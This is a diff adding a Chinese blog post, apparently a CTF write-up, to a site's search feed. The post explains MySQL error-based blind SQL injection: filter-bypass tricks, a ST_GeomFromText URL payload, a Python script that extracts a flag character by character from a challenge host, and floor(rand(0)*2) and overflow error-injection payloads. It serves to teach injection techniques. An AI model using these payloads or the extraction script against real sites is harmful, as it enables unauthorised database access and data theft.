+<p>经过fuzz可以发现这个靶机不论参数传递数字都是会返回同一张图，但是如果存在被ban掉的字符会返回如下图：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-014859@2x.png" alt="WX20210126-014859@2x"></p>
+<p>我们可以借此FUZZ出被ban掉的关键字：</p>
+<pre><code class="MYSQL">union、*、&#39;、&quot;、substr、mid、=、like、into、file、sleep、benchmark、 、^、or、、、、&amp;、&gt;、&lt;、#、-、ascii、ord、floor、extractvalue、updatexml、if、rp、rep、GET_LOCK、info</code></pre>
+<ul>
+<li><p>这里过滤了空格，这里可以直接用<code>\t</code>来代替空格，URL编码后是%09,在写脚本时候可以使用TAB键来代替。</p>
+</li>
+<li><p>过滤了单双引号，可以使用十六进制来代替字符串。</p>
+</li>
+<li><p>过滤了<code>if</code>可以使用<code>case when....then....else...end</code>代替</p>
+</li>
+<li><p>过滤了等于号、大于、小于、减号、like、我们可以使用正则表达式来判断也就是regexp</p>
+</li>
+</ul>
+<p>我们通过上面所讲解的<code>ST_GeomFromText</code>,结合上述过滤考点，构造如下payload,当然空格要用%09代替。</p>
+<pre><code>index.php?cat=1%09and%09IF(0,ST_X(ST_GeomFromText(0x504F494E54286D61647329)),0)</code></pre><p>如果if表达式为false可以发现返回正常的页面：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020116@2x.png" alt="WX20210126-020116@2x"></p>
+<p>若if表达式为true,那么将会返回运行错误的页面：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020240@2x.png" alt="WX20210126-020240@2x"></p>
+<p>据此编写Python脚本：</p>
+<pre><code class="PYTHON">#author：Gqleung
+#Email:  admin@plasf.cn
+#blog:   http://www.plasf.cn
+
+import requests
+
+def ord2hex(string):
+    result = &quot;&quot;
+    for i in string:
+        r = hex(ord(i));
+        r = r.replace(&#39;0x&#39;,&#39;&#39;)
+        result = result+r
+    return &#39;0x&#39;+result
+
+url = &quot;http://47.98.234.232:28076/index.php?cat=&quot;
+tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
+result=&quot;&quot;
+for i in range(1,70):
+    for j in tables:
+        if j ==&quot;{&quot; or j==&quot;}&quot;:
+            j=&#39;\\&#39;+j
+        payload = &quot;1    and    IF((select    flag    from    flag)    regexp    binary    %s,    ST_X(ST_GeomFromText(0x504F494E54286D61647329)),    0)&quot;%(ord2hex(&quot;^&quot;+result+j))
+        r = requests.get(url+payload);
+        if &#39;cat&#39; not in r.text:
+            result=result+j
+            print(result.replace(&#39;\\&#39;,&#39;&#39;))
+            break</code></pre>
+<p>运行结果：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-021628@2x.png" alt="WX20210126-021628@2x"></p>
+<h4 id="FLOOR-X"><a href="#FLOOR-X" class="headerlink" title="FLOOR(X)"></a>FLOOR(X)</h4><p>咱们先了解<a href="#floor">主键重复报错注入</a>的原理</p>
+<h4 id="主键重复报错注入"><a href="#主键重复报错注入" class="headerlink" title="主键重复报错注入"></a>主键重复报错注入</h4><h5 id="FLOOR-X-1"><a href="#FLOOR-X-1" class="headerlink" title="FLOOR(X)"></a><span id="floor">FLOOR(X)</span></h5><p>该函数返回X的最大整数值，但不能大于X，也就是向下取整。</p>
+<p>例如,下列语句5.20返回的值将会是5.</p>
+<pre><code class="mysql">select floor(5.20)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-083818@2x.png" alt="WX20201225-083818@2x"></p>
+<p>我们先来看Payload再来分析其中的原理</p>
+<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
+<ul>
+<li>Q1为什么用<code>floor(rand(0)*2)</code>?</li>
+</ul>
+<p>要回答这个问题，必须从floor报错注入的原理理解：</p>
+<p>例如，user()中含有五条数据：</p>
+<pre><code class="mysql">select rand() from user</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093334@2x.png" alt="WX20201225-093334@2x"></p>
+<p>可以发现会随机生成小于0的随机数。当然<code>rand()*2</code>生成<code>0-1</code>的随机数</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093851@2x.png" alt="WX20201225-093851@2x"></p>
+<p>加上floor就是取整。会生成0或者1的随机值：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094006@2x.png" alt="WX20201225-094006@2x"></p>
+<p>但是为什么用rand(0)呢？</p>
+<p>Rand()两次运行的结果，可以明显地看到rand()产生的结果是随机的。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094117@2x.png" alt="WX20201225-094117@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094710@2x.png" alt="WX20201225-094710@2x"></p>
+<p>Rand(0)两次运行的结果，可以发现两次运行的结果完全一致，说明<code>rand(0)</code>是伪随机的。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
+<p>我们再来了解一下<code>group by</code> 的运作过程。</p>
+<blockquote>
+<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
+</blockquote>
+<p>例如:如下SQL语句：</p>
+<pre><code class="mysql">select id as &quot;number&quot;, contents as &quot;内容&quot; from cat group by number</code></pre>
+<p>执行该sql语句会生成一个新的虚拟表，group by 即指定虚拟表中的对应字段来作为主键。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-131144@2x.png" alt="WX20210120-131144@2x"></p>
+<p>我们知道主键只能是唯一的，如果主键出现重复的情况就会发生报错，将重复的主键输出在报错信息中，我们回过头来看报错注入的Payload.</p>
+<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
+<p>我们看到这里以x 为主键,<code>rand(0)*2</code>生成0-2之间的伪随机数，同时使用<code>floor</code>来取整，出现的只能是值为0或者1（当然前提是表所存储的记录条数要&gt;3条才有可能重复）。使用<code>concat</code>将要查询的内容拼接入主键，这样在报错时会将咱们想要的内容作为报错信息输出。</p>
+<p>例如：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-133637@2x.png" alt="WX20210120-133637@2x"></p>
+<p>注：输出字符长度限制为64个字符</p>
+<p>我们了解完FLOOR（X）报错注入原理后开始从FLOOR(X)报错注入盲注来简述其中的道理，我们直接从payload来看：</p>
+<pre><code class="mysql">select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);</code></pre>
+<p>我们知道floor(rand(0)*2)产生的随机数是伪随机数范围在0-1，如果将其参数的结果作为主键就会造成报错，假设我们用<code>if</code>语句来控制x是否作为主键呢？这就有可能造成不报错的情况，用此来作为报错注入盲注。通常情况与<a href="#spatial">Spatial Functions</a>报错注入盲注类似。</p>
+<pre><code class="mysql">mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);
+ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;
+mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(0,x,0);
++----------+---+
+| count(*) | x |
++----------+---+
+|        2 | 0 |
++----------+---+
+1 row in set (0.00 sec)</code></pre>
+<h4 id="数据溢出型"><a href="#数据溢出型" class="headerlink" title="数据溢出型"></a>数据溢出型</h4><p>在报错注入中数据溢出的函数同样可用如下。</p>
+<pre><code class="mysql">mysql&gt; select pow(2,1024);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;
+mysql&gt; select cot(0);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;
+mysql&gt; select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre>
+<p>### </p>
+]]></content>
+      <tags>
+        <tag>Web安全</tag>
       </tags>
   </entry>
 </search>
